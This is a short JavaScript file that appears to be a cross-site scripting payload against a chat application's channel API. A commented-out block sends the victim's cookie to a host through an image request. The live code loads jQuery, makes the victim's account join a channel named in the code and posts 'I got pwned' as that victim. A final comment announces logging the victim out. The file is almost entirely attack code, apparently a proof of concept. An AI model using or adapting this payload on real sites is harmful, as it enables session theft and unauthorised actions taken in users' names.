// First thing, lets steal the cookie
// var d = document;
// var i = d.createElement("img");
// i.src = 'http://localhost/s.jpg?c=' + encodeURI(d.cookie);
// d.body.appendChild(i);

// Load in JQuery
var jquery = document.createElement('script');
jquery.src = 'https://code.jquery.com/jquery-2.2.1.min.js';
document.head.appendChild(jquery);

// Next, lets add ourselves to the channel "Owned"
// POST /api/v1/channels/hash/join
$.post('/api/v1/channels/noeqkwinr38ax8b456yd866amh/join', function(data, status){
	// lets say we were owned in this channel
	var data = {
		"filenames": [],
		"message": "I got pwned",
		"channel_id": "noeqkwinr38ax8b456yd866amh",
		"pending_post_id": "",
		"user_id": "",
		"create_at":1,
		"state":"loading"
	};
	$.post('/api/v1/channels/noeqkwinr38ax8b456yd866amh/create', data, function(data,status){
	})
})

// Finally, lets log ourselves out, fade the screen to white, and write "Owned"